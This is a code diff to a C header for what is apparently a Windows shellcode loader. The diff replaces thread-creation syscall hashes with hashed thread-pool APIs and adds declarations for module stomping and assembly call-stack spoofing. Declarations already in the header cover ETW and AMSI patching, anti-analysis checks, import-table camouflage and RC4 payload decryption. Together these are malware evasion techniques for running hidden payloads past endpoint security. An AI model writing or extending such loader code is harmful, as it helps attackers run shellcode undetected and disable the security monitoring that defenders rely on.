@@ -37,8 +37,12 @@
 // ----------- Syscall Name Hashes (Jenkins One-at-a-Time 32-bit) -----------
 #define NtAllocateVirtualMemory_JOAAT   0xE33A06BF
 #define NtProtectVirtualMemory_JOAAT    0x82BB0EE0
-#define NtCreateThreadEx_JOAAT          0xE5F15DAA
-#define NtWaitForSingleObject_JOAAT     0xE2C26E26
+#define NtDelayExecution_JOAAT          0xC4714BC3
+
+// ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
+#define TpAllocWork_JOAAT               0xE6CACAE7
+#define TpPostWork_JOAAT                0xBEF96313
+#define TpReleaseWork_JOAAT             0xBA0F3087
 
 // ----------- WinAPI Name Hashes -----------
 #define LoadLibraryA_JOAAT              0xEC33D795
@@ -61,12 +65,10 @@ typedef FARPROC (WINAPI* fnGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
 typedef HMODULE (WINAPI* fnGetModuleHandleA)(LPCSTR lpModuleName);
 typedef BOOL    (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 
-typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
-    PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
-    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
-    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
-    SIZE_T MaximumStackSize, PVOID AttributeList
-);
+// Thread pool function typedefs (ntdll exports)
+typedef NTSTATUS(NTAPI* fnTpAllocWork)(PVOID* WorkReturn, PVOID Callback, PVOID Context, PVOID CallbackEnviron);
+typedef VOID    (NTAPI* fnTpPostWork)(PVOID Work);
+typedef VOID    (NTAPI* fnTpReleaseWork)(PVOID Work);
 
 // ----------- Resolved WinAPI Function Pointers -----------
 typedef struct _API_HASHING {
@@ -103,6 +105,13 @@ VOID IatCamouflage(VOID);
 BOOL PatchEtw(IN PAPI_HASHING pApi);
 BOOL PatchAmsi(IN PAPI_HASHING pApi);
 BOOL AntiAnalysis(VOID);
+
+// ----------- Module Stomping -----------
+BOOL ModuleStomp(IN PAPI_HASHING pApi, IN PBYTE pShellcode, IN DWORD dwShellcodeSize, OUT PVOID* ppExecAddr);
+
+// ----------- Call Stack Spoofing (ASM) -----------
+extern VOID SetSpoofTarget(PVOID pTarget);
+extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);
 
 // ----------- Crypto -----------
 BOOL Rc4DecryptPayload(IN PAPI_HASHING pApi, IN PBYTE pCipherText, IN DWORD dwCipherSize, IN PBYTE pKey, IN DWORD dwKeySize);
